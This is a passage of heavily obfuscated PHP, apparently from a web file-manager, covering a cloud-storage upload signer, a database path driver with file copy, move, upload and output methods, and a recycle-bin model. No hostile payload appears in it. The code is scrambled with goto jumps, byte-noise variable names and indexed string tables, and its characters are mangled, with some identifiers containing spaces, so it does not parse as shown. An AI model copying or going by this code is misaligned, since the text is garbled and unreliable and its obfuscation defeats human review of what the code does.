$eÕíöÃ£â[$B·“÷›İÎÚ[354]]; } } $AôÁåÁÇÁ• = $b™ä¯ÏÇˆ÷; } $CØ•ç·º×ø = Model($B·“÷›İÎÚ[2411]); foreach ($a¸ñØ…”¢ as &$fÑãºÓš) { $fÑãºÓš[$B·“÷›İÎÚ[413]] = array(); $fÑãºÓš[$B·“÷›İÎÚ[2412]] = array(); if (isset($e¾Ÿ²ÅÏ[$fÑãºÓš[$B·“÷›İÎÚ[1341]]])) { $fÑãºÓš[$B·“÷›İÎÚ[413]] = $e¾Ÿ²ÅÏ[$fÑãºÓš[$B·“÷›İÎÚ[1341]]]; } if (isset($fÑãºÓš[$B·“÷›İÎÚ[413]][$e¢™É•×°¢])) { $fÑãºÓš[$B·“÷›İÎÚ[2412]] = $CØ•ç·º×ø->getUserJobInfo($fÑãºÓš[$B·“÷›İÎÚ[413]][$e¢™É•×°¢]); } } goto Fíé’ê‹‘; fÎÃ¤âšÄ: $B·“÷›İÎÚ =& $_SERVER[÷ÖêïÔÔÓ]; $e¢™É•×°¢ = UserJobModel::JOB_KEY; $d„„•àêº = array($B·“÷›İÎÚ[2383]); goto BëˆÇ‚¡Œ; BëˆÇ‚¡Œ: $B¼é°áÂø– = array($B·“÷›İÎÚ[1341] => array($B·“÷›İÎÚ[7], $fÑÚÃ¹˜³)); $e¾Ÿ²ÅÏ = Model($B·“÷›İÎÚ[2380])->where($B¼é°áÂø–)->select(); $e¾Ÿ²ÅÏ = array_to_keyvalue_group($e¾Ÿ²ÅÏ, $B·“÷›İÎÚ[1341]); goto b‚ÊËáä…Ö; Fíé’ê‹‘: } public function userSearch($fÔ­† ÀÁØ, $D§¨çŞö¡ = "\52") { return Model($_SERVER[÷ÖêïÔÔÓ][469])->where($fÔ­† ÀÁØ)->field($D§¨çŞö¡)->find(); } } goto BƒÍ•¹Œî; B¶µ¼å©ãØ: function beforeShutdown() { Hook::trigger($_SERVER[Óº‹‘Î][35]); } $_SERVER[$_SERVER[Óº‹‘Î][36]] = BASIC_PATH; $_SERVER[$_SERVER[Óº‹‘Î][37]] = LIB_DIR; goto fŞô´¾¨Áğ; bé—ƒ—Ş: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Cì”ÌÛÜÒ) { parent::__construct($Cì”ÌÛÜÒ); $this->signatureVersion($_SERVER[÷ÖêïÔÔÓ][197]); } public function uploadFormData($Cğ»äñ†ùÛ, $D²¸ô‚­«İ = 3600) { goto bÜ™ÜŸ·´Ä; bÜ™ÜŸ·´Ä: $a¼ø˜œÜŞº =& $_SERVER[÷ÖêïÔÔÓ]; $b†Ø°±œá… = $a¼ø˜œÜŞº[182]; $A©•ÏĞàù = $a¼ø˜œÜŞº[215]; goto C¹ö›ËïšŸ; FîÍ¬Œì¼¦: $DÆ¥­ƒï = array($a¼ø˜œÜŞº[1064] => $F¿ä»­ÍÄé, $a¼ø˜œÜŞº[1065] => array(array($a¼ø˜œÜŞº[1066] => $b†Ø°±œá…), array($a¼ø˜œÜŞº[1067] => $this->bucket), array($a¼ø˜œÜŞº[1068], $a¼ø˜œÜŞº[1069], $a¼ø˜œÜŞº[33]), array($a¼ø˜œÜŞº[1070] => $fŒ×ºçá‡¿), array($a¼ø˜œÜŞº[1071] => $A©•ÏĞàù), array($a¼ø˜œÜŞº[1072] => $this->accessKey), array($a¼ø˜œÜŞº[1073] => $EĞì¤µ¤ïø))); $DÆ¥­ƒï = json_encode($DÆ¥­ƒï); $b¢¥‡ƒÙ‘ñ = hash_hmac($a¼ø˜œÜŞº[215], $EĞì¤µ¤ïø, $this->secret); goto c‡É¤‘„ËÏ; C¹ö›ËïšŸ: $fŒ×ºçá‡¿ = $a¼ø˜œÜŞº[1062]; $F¿ä»­ÍÄé = gmdate($a¼ø˜œÜŞº[1063], time() + $D²¸ô‚­«İ); $EĞì¤µ¤ïø = (string) time() . $a¼ø˜œÜŞº[68] . (string) (time() + $D²¸ô‚­«İ); goto FîÍ¬Œì¼¦; c‡É¤‘„ËÏ: $AÃÍò¯¹ß = sha1($DÆ¥­ƒï); $B¹µ‹µˆ¹‘ = hash_hmac($a¼ø˜œÜŞº[215], $AÃÍò¯¹ß, $b¢¥‡ƒÙ‘ñ); $C½–Š‘é­ = array($a¼ø˜œÜŞº[1066] => $b†Ø°±œá…, $a¼ø˜œÜŞº[1070] => $fŒ×ºçá‡¿, $a¼ø˜œÜŞº[1074] => base64_encode($DÆ¥­ƒï), $a¼ø˜œÜŞº[1071] => $A©•ÏĞàù, $a¼ø˜œÜŞº[1072] => $this->accessKey, $a¼ø˜œÜŞº[1075] => $EĞì¤µ¤ïø, $a¼ø˜œÜŞº[1076] => $B¹µ‹µˆ¹‘, $a¼ø˜œÜŞº[166] => $this->getHost()); goto D¡á™±…Œ; D¡á™±…Œ: return $C½–Š‘é­; goto eÉ£†à„…Œ; eÉ£†à„…Œ: } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($c‹óùº‘«Ò) { $this->pathParse = $c‹óùº‘«Ò; $this->model = Model($_SERVER[÷ÖêïÔÔÓ][1077]); } public function getPath($f¤¯·÷±ôÃ) { return trim($f¤¯·÷±ôÃ, $_SERVER[÷ÖêïÔÔÓ][8]); } public function pathFather($c‰‹ÏÉÊ‚) { $b½Ş›àØí = $this->parse($c‰‹ÏÉÊ‚); $b½Ş›àØí = $this->infoSimple($c‰‹ÏÉÊ‚); return $b½Ş›àØí ? $b½Ş›àØí[$_SERVER[÷ÖêïÔÔÓ][457]] : !1; } public function getPathName($d¸ë‘ËÔ…÷) { $fùíƒ¡”Ì = $this->infoSimple($d¸ë‘ËÔ…÷); return $fùíƒ¡”Ì ? $fùíƒ¡”Ì[$_SERVER[÷ÖêïÔÔÓ][28]] : !1; } public function getPathOuter($DùÔÌÊø») { if (!$DùÔÌÊø») { return $DùÔÌÊø»; } $F¯ŒœåšÒ‡ = $this->parse($DùÔÌÊø»); return KodIO::make($F¯ŒœåšÒ‡[$_SERVER[÷ÖêïÔÔÓ][364]]); } public function copyFolderFromIO($f“³²•Äí¹, $còÉêøœ‚Õ, $DÄ¬ºº¨Ò, $e±¶ÉÃç®ì, $Cîè‹‹ò¡) { $DºØİíºğ = $this->model->copyFolderFromIO($f“³²•Äí¹, $còÉêøœ‚Õ, $DÄ¬ºº¨Ò, $e±¶ÉÃç®ì, $Cîè‹‹ò¡); return KodIO::make($DºØİíºğ); } public function isParentOf($Bî‘”‹Ù°±, $dñî¤…¯Ó) { return $this->model->isParentOf($Bî‘”‹Ù°±, $dñî¤…¯Ó); } public function mkfile($fÙùÚŞ¼¢, $B‘˜›—ï£Ô = '', $Aèé’ä¼…× = REPEAT_RENAME) { $A³¿¯Ëº Â =& $_SERVER[÷ÖêïÔÔÓ]; $eçÆ¹İô÷ö = $this->parse($fÙùÚŞ¼¢); $fÙùÚŞ¼¢ = $eçÆ¹İô÷ö[$A³¿¯Ëº Â[364]]; for ($FÀ±ù‡†˜» = 0; $FÀ±ù‡†˜» < count($eçÆ¹İô÷ö[$A³¿¯Ëº Â[1078]]); $FÀ±ù‡†˜»++) { $D™æğ¿½Ç² = $eçÆ¹İô÷ö[$A³¿¯Ëº Â[1078]][$FÀ±ù‡†˜»]; if ($FÀ±ù‡†˜» == count($eçÆ¹İô÷ö[$A³¿¯Ëº Â[1078]]) - 1) { $fÙùÚŞ¼¢ = $this->model->mkfile($fÙùÚŞ¼¢, $D™æğ¿½Ç², $B‘˜›—ï£Ô, $Aèé’ä¼…×); break; } $fÙùÚŞ¼¢ = $this->model->mkdir($fÙùÚŞ¼¢, $D™æğ¿½Ç², REPEAT_SKIP); } return $this->getPathOuter($fÙùÚŞ¼¢); } public function mkdir($Bç‘ìÛá…, $B“Ø» ïê = REPEAT_SKIP) { $B­êØ¿È– =& $_SERVER[÷ÖêïÔÔÓ]; $EÅ…„²“É¦ = $this->parse($Bç‘ìÛá…); $Bç‘ìÛá… = $EÅ…„²“É¦[$B­êØ¿È–[364]]; for ($dêƒƒ³Ï = 0; $dêƒƒ³Ï < count($EÅ…„²“É¦[$B­êØ¿È–[1078]]); $dêƒƒ³Ï++) { $dœ‚À¸ÚÖ = $EÅ…„²“É¦[$B­êØ¿È–[1078]][$dêƒƒ³Ï]; $Bç‘ìÛá… = $this->model->mkdir($Bç‘ìÛá…, $dœ‚À¸ÚÖ, $B“Ø» ïê); } return $this->getPathOuter($Bç‘ìÛá…); } public function copyFile($d¼µÆí……Ö, $Eİƒ•ë±çº, $f³¹Íˆî = REPEAT_REPLACE) { $aËàé©´øÎ =& $_SERVER[÷ÖêïÔÔÓ]; $EáÂÏÃÏ†ğ = $this->parse($Eİƒ•ë±çº); $A•Ò¬•‚Ÿ = $this->model->copy($d¼µÆí……Ö, $EáÂÏÃÏ†ğ[$aËàé©´øÎ[364]], $f³¹Íˆî, $EáÂÏÃÏ†ğ[$aËàé©´øÎ[76]]); return $A•Ò¬•‚Ÿ ? $this->getPathOuter($A•Ò¬•‚Ÿ) : !1; } public function moveFile($aÁ¶ĞÑÓé, $CÏÑíï«®, $Eñ‘ÔÑî„‘ = REPEAT_REPLACE) { $dæÎéÛğ­ =& $_SERVER[÷ÖêïÔÔÓ]; $a–Ì‡ÑáËô = $this->parse($CÏÑíï«®); $Bèä¾´Äò· = $this->model->move($aÁ¶ĞÑÓé, $a–Ì‡ÑáËô[$dæÎéÛğ­[364]], $Eñ‘ÔÑî„‘, $a–Ì‡ÑáËô[$dæÎéÛğ­[76]]); return $Bèä¾´Äò· ? $this->getPathOuter($Bèä¾´Äò·) : !1; } public function copy($Câ“í¢îì÷, $føë‹ï®øì, $A›Â¾Ùñœ = REPEAT_REPLACE) { $D”‰ñÈ¯ÑÖ = $this->parse($føë‹ï®øì); $E¬ó·Îºéƒ = $this->model->copy($Câ“í¢îì÷, $D”‰ñÈ¯ÑÖ[$_SERVER[÷ÖêïÔÔÓ][364]], $A›Â¾Ùñœ); return $E¬ó·Îºéƒ ? $this->getPathOuter($E¬ó·Îºéƒ) : !1; } public function move($E†©ÚÚ‰Šğ, $CÏ˜½¾‹, $D¢ì¾ íŠ = REPEAT_REPLACE) { $d×·“œÇô­ = $this->parse($CÏ˜½¾‹); $B…íÖ£Ï“² = $this->model->move($E†©ÚÚ‰Šğ, $d×·“œÇô­[$_SERVER[÷ÖêïÔÔÓ][364]], $D¢ì¾ íŠ); return $B…íÖ£Ï“² ? $this->getPathOuter($B…íÖ£Ï“²) : !1; } public function remove($f¥à³Ü©, $CÓ­¢êÙ¿ã = true) { return $this->model->remove($f¥à³Ü©, $CÓ­¢êÙ¿ã); } public function rename($DÓ”¡½° Ü, $AÀ©æ‹ÈŒ¶) { $A–ç¢Æ¡Ğ = $this->model->rename($DÓ”¡½° Ü, $AÀ©æ‹ÈŒ¶); return $A–ç¢Æ¡Ğ ? $this->getPathOuter($DÓ”¡½° Ü) : $A–ç¢Æ¡Ğ; } public function size($AÚÛø“‚äö) { $a¼ğ¥æ·Ò = $this->infoSimple($AÚÛø“‚äö); return $a¼ğ¥æ·Ò ? $a¼ğ¥æ·Ò[$_SERVER[÷ÖêïÔÔÓ][78]] : 0; } public function infoSimple($e‰§¬šô’á) { return $this->model->sourceInfo($e‰§¬šô’á); } public function info($cŠõË×Ü‹§) { return $this->infoParse($cŠõË×Ü‹§); } public function infoAuth($DÍ÷ä‚Áİ) { return $this->infoParse($DÍ÷ä‚Áİ, !1, !0); } public function infoWithChildren($Dª÷íÂİ) { return $this->infoParse($Dª÷íÂİ, !0); } protected function infoParse($F›Û¡æ«©è, $cÔ‹ò¨¦Ú· = false, $E»ŞÑ‚ĞÑè = false) { if (!$cÔ‹ò¨¦Ú·) { return $this->model->pathInfo($F›Û¡æ«©è, $E»ŞÑ‚ĞÑè); } return $this->model->pathInfoMore($F›Û¡æ«©è); } public function infoFull($Dä©õôÍïÂ) { $dœçí¹ë¾ñ =& $_SERVER[÷ÖêïÔÔÓ]; $fº£˜ŠŞ = explode($dœçí¹ë¾ñ[8], $Dä©õôÍïÂ); $FÒÁÊ³›í· = implode($dœçí¹ë¾ñ[8], array_splice($fº£˜ŠŞ, 1)); return $this->model->pathInfoByPath($fº£˜ŠŞ[0], $FÒÁÊ³›í·); } public function hashSimple($A³ÌÁøõïó) { $A”«· ã§ì =& $_SERVER[÷ÖêïÔÔÓ]; $Aƒ¬å¿‡¢ = $this->infoWithChildren($A³ÌÁøõïó); return $Aƒ¬å¿‡¢[$A”«· ã§ì[159]][$A”«· ã§ì[161]]; } public function hashMd5($bÃ¥­éÉ«) { $f°Û÷‹İ =& $_SERVER[÷ÖêïÔÔÓ]; $eÄ¢æ‹›· = $this->infoWithChildren($bÃ¥­éÉ«); return $eÄ¢æ‹›·[$f°Û÷‹İ[159]][$f°Û÷‹İ[160]]; } public function exist($d÷·ô«œ‚ô) { $a…¤™á–‚£ =& $_SERVER[÷ÖêïÔÔÓ]; $D¶ŸÅÇô‡À = $this->parse($d÷·ô«œ‚ô); if (!$D¶ŸÅÇô‡À[$a…¤™á–‚£[76]]) { return $this->isFile($d÷·ô«œ‚ô) || $this->isFolder($d÷·ô«œ‚ô); } $båƒŸğØ¤ = array($a…¤™á–‚£[365] => $D¶ŸÅÇô‡À[$a…¤™á–‚£[364]], $a…¤™á–‚£[28] => $D¶ŸÅÇô‡À[$a…¤™á–‚£[76]]); $dÃÀº¶¾”ƒ = $this->model->where($båƒŸğØ¤)->find(); return $dÃÀº¶¾”ƒ ? !0 : !1; } public function isFile($e¡¡©—ÏÉÏ) { $cƒÀº’–‡Ñ =& $_SERVER[÷ÖêïÔÔÓ]; $C¶­¦¦½ Ò = $this->infoSimple($e¡¡©—ÏÉÏ); return $C¶­¦¦½ Ò && $C¶­¦¦½ Ò[$cƒÀº’–‡Ñ[367]] == $cƒÀº’–‡Ñ[493] ? !1 : !0; } public function isFolder($c—Õ·¼ÈÃ) { $bœé¾õ’ç =& $_SERVER[÷ÖêïÔÔÓ]; $B´åÖ«´ê¬ = $this->infoSimple($c—Õ·¼ÈÃ); return $B´åÖ«´ê¬ && $B´åÖ«´ê¬[$bœé¾õ’ç[367]] == $bœé¾õ’ç[493] ? !0 : !1; } public function listPath($aõ›Îöæ‘°, $Bè‘Ùç¶²Ì = false) { $FŞÔ·…¬ö =& $_SERVER[÷ÖêïÔÔÓ]; if ($aõ›Îöæ‘° == $FŞÔ·…¬ö[33]) { return !1; } $Fç ÚçÙÉù = array($FŞÔ·…¬ö[365] => $aõ›Îöæ‘°); if ($Bè‘Ùç¶²Ì) { return $this->model->listSource($Fç ÚçÙÉù, -1); } return $this->model->listSource($Fç ÚçÙÉù); } public function has($E”³ß×Ã‰, $bçğšÑÏÕá = false, $b÷ÈÅƒªÎ¸ = null) { $cä‘ÈÅ„òÄ =& $_SERVER[÷ÖêïÔÔÓ]; $Cµ†í©ğ = $this->infoWithChildren($E”³ß×Ã‰); if ($bçğšÑÏÕá) { return array($cä‘ÈÅ„òÄ[189] => $Cµ†í©ğ[$cä‘ÈÅ„òÄ[189]], $cä‘ÈÅ„òÄ[188] => $Cµ†í©ğ[$cä‘ÈÅ„òÄ[188]]); } return $b÷ÈÅƒªÎ¸ ? $Cµ†í©ğ[$cä‘ÈÅ„òÄ[189]] : $Cµ†í©ğ[$cä‘ÈÅ„òÄ[188]]; } public function listAll($aƒ¹ÎŒæğ) { $D­àöÖ‚ª = IO::info($this->pathParse[$_SERVER[÷ÖêïÔÔÓ][76]]); if (!$D­àöÖ‚ª) { return array(); } return $this->model->listAll($aƒ¹ÎŒæğ); } public function getContent($fè‡’ÑôÜ) { return $this->model->getContent($fè‡’ÑôÜ); } public function setContent($bÏòÑ£™ƒ, $EòÑ…†ÑùÆ = '') { return $this->model->setContent($bÏòÑ£™ƒ, $EòÑ…†ÑùÆ); } public function fileSubstr($cø‘©á‰Ü, $AÁ¤ºóë×”, $Eé‚õ¯ÔÃ–) { return $this->model->fileSubstr($cø‘©á‰Ü, $AÁ¤ºóë×”, $Eé‚õ¯ÔÃ–); } public function download($díŠÑÙâ¢, $aëÕÆãø…Ù = '') { $CÊ¤Íëïç® = get_path_father($aëÕÆãø…Ù); $cáïÃÅòêº = get_path_this($aëÕÆãø…Ù); $aÀÙ«‘åÃí = $this->model->fileInfoGet($díŠÑÙâ¢); $C´¥±’…Ó = IO::copy($aÀÙ«‘åÃí[$_SERVER[÷ÖêïÔÔÓ][76]], $CÊ¤Íëïç®, !1, $cáïÃÅòêº); return $C´¥±’…Ó; } public function upload($BŠÌÄŸ³œÆ, $B¯¡ˆùÂ˜, $d…Ğ›¹‡¯“ = false, $AŞê¥˜ë½Õ = REPEAT_REPLACE) { $fª‹ÃĞ¡‘ =& $_SERVER[÷ÖêïÔÔÓ]; $e‰°ŠÏëßœ = $this->parse($BŠÌÄŸ³œÆ); $DˆË¾Û‡Ãµ = $this->model->addFile($e‰°ŠÏëßœ[$fª‹ÃĞ¡‘[364]], $B¯¡ˆùÂ˜, $e‰°ŠÏëßœ[$fª‹ÃĞ¡‘[76]], $d…Ğ›¹‡¯“, $AŞê¥˜ë½Õ); return $this->getPathOuter($DˆË¾Û‡Ãµ); } public function uploadFileByID($Eö¥ÁêÌä, $E–èãÒß¾´, $CÜË½ˆµÇ—) { $b ŸØ¿†ÈÂ =& $_SERVER[÷ÖêïÔÔÓ]; $a’™ö¯–› = $this->parse($Eö¥ÁêÌä); $cöšëÓ°†Ú = $this->model->addFileByFileID($a’™ö¯–›[$b ŸØ¿†ÈÂ[364]], $E–èãÒß¾´, $a’™ö¯–›[$b ŸØ¿†ÈÂ[76]], $CÜË½ˆµÇ—); return $this->getPathOuter($cöšëÓ°†Ú); } public function addFileByRemote($e£¸¨ã¹¸, $aÍ´Ïç›¿â, $DØÀÔºÆÍø = array(), $Aò‹ ‹÷õ® = '', $AµÊ—æ‹¡È) { $C›°–ò©ç© =& $_SERVER[÷ÖêïÔÔÓ]; $B©ô¸Ù©ë´ = $this->parse($e£¸¨ã¹¸); $Aò‹ ‹÷õ® = empty($Aò‹ ‹÷õ®) ? $B©ô¸Ù©ë´[$C›°–ò©ç©[76]] : $Aò‹ ‹÷õ®; $D®á§‰¥òå = $this->model->addFileByRemote($B©ô¸Ù©ë´[$C›°–ò©ç©[364]], $aÍ´Ïç›¿â, $Aò‹ ‹÷õ®, $DØÀÔºÆÍø, $AµÊ—æ‹¡È); return $this->getPathOuter($D®á§‰¥òå); } public function uploadLink($aÌ©ù†÷„, $e…ƒëî‰·­ = 0) { $bàĞ’¾ =& $_SERVER[÷ÖêïÔÔÓ]; $c¦Ÿ§©‰‡ = $this->parse($aÌ©ù†÷„); $aÌ©ù†÷„ = Model($bàĞ’¾[536])->createFileName($c¦Ÿ§©‰‡[$bàĞ’¾[76]]); $BÁø„Âİ­‚ = IO::uploadLink($aÌ©ù†÷„, $e…ƒëî‰·­); return $BÁø„Âİ­‚; } public function fileNameAuto($cƒ‰Èƒİî, $e‘ê—…ƒ», $F¦§æ·ÆĞ• = REPEAT_REPLACE, $E¦±¨‹Öò = false) { return $this->model->fileNameAuto($cƒ‰Èƒİî, $e‘ê—…ƒ», $F¦§æ·ÆĞ•, $E¦±¨‹Öò); } public function fileNameExist($DÓØÀ¼˜ñ, $B«Î¢£†„¦) { return $this->model->fileNameExist($DÓØÀ¼˜ñ, $B«Î¢£†„¦); } protected function _fileOut($D‚ôœÚ¥†¿, $D³œšõ¾ï = false, $E§ÖÒ×Ğ¦ï = false, $c›ÈØÈ¼É¿ = '', $a‚Èáï = false) { goto EÛáÉæ­… ; FÇË¾¿Ï‡Ø: $D·¶íß¡±Š = $this->model->fileInfoGet($D‚ôœÚ¥†¿); $c›ÈØÈ¼É¿ = $D·¶íß¡±Š[$EÅ‚œ„²ªù[160]] ? $D·¶íß¡±Š[$EÅ‚œ„²ªù[160]] : $c›ÈØÈ¼É¿; $AóÎù –ºÃ = isset($GLOBALS[$EÅ‚œ„²ªù[1080]]) ? $GLOBALS[$EÅ‚œ„²ªù[1080]] : $fµ’ó¦ğğ‘[$EÅ‚œ„²ªù[28]]; goto aç±µÙ“¢š; EÛáÉæ­… : $EÅ‚œ„²ªù =& $_SERVER[÷ÖêïÔÔÓ]; $fµ’ó¦ğğ‘ = $this->model->sourceInfo($D‚ôœÚ¥†¿); if ($fµ’ó¦ğğ‘[$EÅ‚œ„²ªù[367]] == $EÅ‚œ„²ªù[493]) { header($EÅ‚œ„²ªù[1079]); die; } goto FÇË¾¿Ï‡Ø; aç±µÙ“¢š: if ($a‚Èáï) { return IO::fileOutServer($D·¶íß¡±Š[$EÅ‚œ„²ªù[76]], $D³œšõ¾ï, $AóÎù –ºÃ, $c›ÈØÈ¼É¿); } IO::fileOut($D·¶íß¡±Š[$EÅ‚œ„²ªù[76]], $D³œšõ¾ï, $AóÎù –ºÃ, $c›ÈØÈ¼É¿); goto c½¢Ó•ØøÍ; c½¢Ó•ØøÍ: } public function fileOut($BÃ…ªø¢ä, $D„ã§¨´Ó = false, $Bé†ŒÍÒÀ« = false, $cèíµ³¬¡‹ = '') { $this->_fileOut($BÃ…ªø¢ä, $D„ã§¨´Ó, $Bé†ŒÍÒÀ«, $cèíµ³¬¡‹); } public function fileOutServer($D¦Ê¦©Š•š, $cåë³¸ÉÁÀ = false, $e˜à’äç¤¿ = false, $eºÊõ”äƒš = '') { $this->_fileOut($D¦Ê¦©Š•š, $cåë³¸ÉÁÀ, $e˜à’äç¤¿, $eºÊõ”äƒš, !0); } protected function _fileOutImage($A®ÓŒšâÂ, $cÕÙÈ¤ëĞ = 250) { $eŞ£—ßøå =& $_SERVER[÷ÖêïÔÔÓ]; $FÜ…‰„” = $this->model->sourceInfo($A®ÓŒšâÂ); if ($FÜ…‰„”[$eŞ£—ßøå[367]] == $eŞ£—ßøå[493]) { show_json($eŞ£—ßøå[1081] . $A®ÓŒšâÂ, !1); } $GLOBALS[$eŞ£—ßøå[1080]] = $FÜ…‰„”[$eŞ£—ßøå[28]]; $eê¿ŒøŞ½ƒ = $this->model->fileInfoGet($A®ÓŒšâÂ); IO::fileOutImage($eê¿ŒøŞ½ƒ[$eŞ£—ßøå[76]], $cÕÙÈ¤ëĞ); } public function fileOutImage($e½Ô’ÓÔÅ…, $Aæ†ãÎˆø† = 250) { $this->_fileOutImage($e½Ô’ÓÔÅ…, $Aæ†ãÎˆø†); } public function fileOutImageServer($bØ¢Ö…¥Š‹, $aÓœ ÷ùŠÚ = 250) { $this->_fileOutImage($bØ¢Ö…¥Š‹, $aÓœ ÷ùŠÚ); } public function link($bÛ±’­œØË, $cŒ©·½§• = '') { $dÎÇÏÄ¢½ï = $this->model->fileInfoGet($bÛ±’­œØË); return IO::link($dÎÇÏÄ¢½ï[$_SERVER[÷ÖêïÔÔÓ][76]], $cŒ©·½§•); } protected function parse($EÔÒæÎÑù¨) { $BÒéÇåÊ¹Ú =& $_SERVER[÷ÖêïÔÔÓ]; if (strstr($EÔÒæÎÑù¨, $BÒéÇåÊ¹Ú[8]) === !1) { return array($BÒéÇåÊ¹Ú[382] => intval($EÔÒæÎÑù¨), $BÒéÇåÊ¹Ú[76] => $BÒéÇåÊ¹Ú[33], $BÒéÇåÊ¹Ú[1078] => array()); } $f¹šòÇê¹¢ = explode($BÒéÇåÊ¹Ú[8], trim($EÔÒæÎÑù¨, $BÒéÇåÊ¹Ú[8])); if (count($f¹šòÇê¹¢) < 2) { show_tips($EÔÒæÎÑù¨ . $BÒéÇåÊ¹Ú[1082]); } return array($BÒéÇåÊ¹Ú[382] => intval($f¹šòÇê¹¢[0]), $BÒéÇåÊ¹Ú[76] => $f¹šòÇê¹¢[1], $BÒéÇåÊ¹Ú[1078] => array_slice($f¹šòÇê¹¢, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($Aµ¥ööˆ™é) { $this->pathParse = $Aµ¥ööˆ™é; $this->model = Model($_SERVER[÷ÖêïÔÔÓ][1077]); } public function getPathOuter($EÍŒÉ´¼ÒÔ) { $CÖ’À…ó¹ì =& $_SERVER[÷ÖêïÔÔÓ]; if (!$EÍŒÉ´¼ÒÔ) { return $EÍŒÉ´¼ÒÔ; } $b™…ŒèŸ†Ë = $this->parse($EÍŒÉ´¼ÒÔ); return trim(KodIO::makeShare($this->pathParse[$CÖ’À…ó¹ì[364]], $b™…ŒèŸ†Ë[$CÖ’À…ó¹ì[364]]), $CÖ’À…ó¹ì[8]); } protected function infoParse($e®é¹†øó, $E…Í‹·åâ = false, $FğÍ‚âƒ‘¦ = false) { $cÕ²”Úó‡† =& $_SERVER[÷ÖêïÔÔÓ]; $b×‘ˆÜ÷‡ß = $this->pathParse[$cÕ²”Úó‡†[364]]; $AÀ‘Ş–¿§¬ = trim($this->pathParse[$cÕ²”Úó‡†[984]], $cÕ²”Úó‡†[8]); return Action($cÕ²”Úó‡†[1083])->sharePathInfo($b×‘ˆÜ÷‡ß, $AÀ‘Ş–¿§¬); } public function infoFull($BÔŠàÏÏøí) { $DšÓÍäœƒ =& $_SERVER[÷ÖêïÔÔÓ]; $D‡ÃÏÖß‰± = explode($DšÓÍäœƒ[8], trim($BÔŠàÏÏøí, $DšÓÍäœƒ[8])); if (count($D‡ÃÏÖß‰±) > 1) { $DËĞ¬°ÓˆĞ = implode($DšÓÍäœƒ[8], array_splice($D‡ÃÏÖß‰±, 1)); $b¿“Œì—‰ó = $this->model->pathInfoByPath($D‡ÃÏÖß‰±[0], $DËĞ¬°ÓˆĞ); if (!$b¿“Œì—‰ó) { return !1; } $this->pathParse[$DšÓÍäœƒ[984]] = $b¿“Œì—‰ó[$DšÓÍäœƒ[366]]; } return $this->infoParse($BÔŠàÏÏøí); } public function listAll($dÓÒóƒõÔğ) { goto dä¸ÂÇå¶‰; Cçáá¡ä°×: foreach ($Bè¹’­›• as &$AõÌæÓ®¤†) { check_abort(); $AõÌæÓ®¤†[$D©Õ÷ÆŸ²[388]] = $dœ°ì›‰Ï—->_shareItemeParse($AõÌæÓ®¤†[$D©Õ÷ÆŸ²[388]], $dÖ­¡‰ÓÚœ); } return $Bè¹’­›•; goto eöœ›ƒ†‰; dä¸ÂÇå¶‰: $D©Õ÷ÆŸ² =& $_SERVER[÷ÖêïÔÔÓ]; $CÆÉê¦íÚ = IO::info($this->pathParse[$D©Õ÷ÆŸ²[76]]); if (!$CÆÉê¦íÚ) { return array(); } goto c×¬è’í×; c×¬è’í×: $Bè¹’­›• = $this->model->listAll($dÓÒóƒõÔğ); $dÖ­¡‰ÓÚœ = Model($D©Õ÷ÆŸ²[528])->getInfo($CÆÉê¦íÚ[$D©Õ÷ÆŸ²[437]]); $dœ°ì›‰Ï— = Action($D©Õ÷ÆŸ²[1083]); goto Cçáá¡ä°×; eöœ›ƒ†‰: } } goto aâ¶ÉÇ˜ğ; f°ºÃóÜò“: class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\165\x72\143\145\137\x72\145\143\171\x63\x6c\x65"; protected $dataAuto = array(array("\x63\162\145\x61\x74\145\124\151\x6d\x65", "\164\x69\155\145", "\x69\x6e\163\x65\x72\x74", "\x66\165\x6e\143\164\x69\x6f\156")); public function listData($BÎ˜Ç…ï“ = false) { $aè‘Ô‡ •‹ =& $_SERVER[÷ÖêïÔÔÓ]; $BÎ˜Ç…ï“ = $BÎ˜Ç…ï“ ? $BÎ˜Ç…ï“ : USER_ID; $e„Áøö³ê· = $this->where(array($aè‘Ô‡ •‹[1332] => $BÎ˜Ç…ï“))->select(); return array_to_keyvalue($e„Áøö³ê·, $aè‘Ô‡ •‹[33], $aè‘Ô‡ •‹[366]); } public function moveToRecycle($bŠÅŞªÓè¢) { goto dÓˆÔíŒôâ; dÓˆÔíŒôâ: $dÄ´‹Ãî =& $_SERVER[÷ÖêïÔÔÓ]; $fœÒ¨’±ÎÂ = Model($dÄ´‹Ãî[1077]); $D”ÔÉ¸¯ · = $fœÒ¨’±ÎÂ->sourceInfo($bŠÅŞªÓè¢); goto e…™ó÷å¿Š; e…™ó÷å¿Š: if (!$D”ÔÉ¸¯ · || $D”ÔÉ¸¯ ·[$dÄ´‹Ãî[393]] == $dÄ´‹Ãî[493]) { return; } $a’íâ§‰–› = array($dÄ´‹Ãî[380] => $bŠÅŞªÓè¢, $dÄ´‹Ãî[1332] => USER_ID, $dÄ´‹Ãî[514] => $D”ÔÉ¸¯ ·[$dÄ´‹Ãî[368]], $dÄ´‹Ãî[515] => $D”ÔÉ¸¯ ·[$dÄ´‹Ãî[452]], $dÄ´‹Ãî[518] => $D”ÔÉ¸¯ ·[$dÄ´‹Ãî[455]]); $this->add($a’íâ§‰–›); goto BÅƒŸåÁŠ³; BÅƒŸåÁŠ³: $this->recycleMove($bŠÅŞªÓè¢, 1); if ($D”ÔÉ¸¯ ·[$dÄ´‹Ãî[367]] == $dÄ´‹Ãî[493]) { $BÁğÚ‚öÍ¯ = array($dÄ´‹Ãî[518] => array($dÄ´‹Ãî[475], $D”ÔÉ¸¯ ·[$dÄ´‹Ãî[455]] . $bŠÅŞªÓè¢ . $dÄ´‹Ãî[476])); $fœÒ¨’±ÎÂ->where($BÁğÚ‚öÍ¯)->setField($dÄ´‹Ãî[393], 1); } goto DÔƒŒèéæ; DÔƒŒèéæ: } public function clear() { $this->remove(!1); } public function remove($EÆŸğ…‰‚š = false) { goto b»˜Õ¶ù¾ƒ; EÂçÜ©‹õ: $EÆŸğ…‰‚š = $EÆŸğ…‰‚š === !1 ? !1 : $EÆŸğ…‰‚š; $fÙñ´¾ùğ… = array(); foreach ($f«¬›è¨ìù as $f§Ö¾‡“àñ) { if ($EÆŸğ…‰‚š != !1 && !in_array($f§Ö¾‡“àñ, $EÆŸğ…‰‚š)) { continue; } 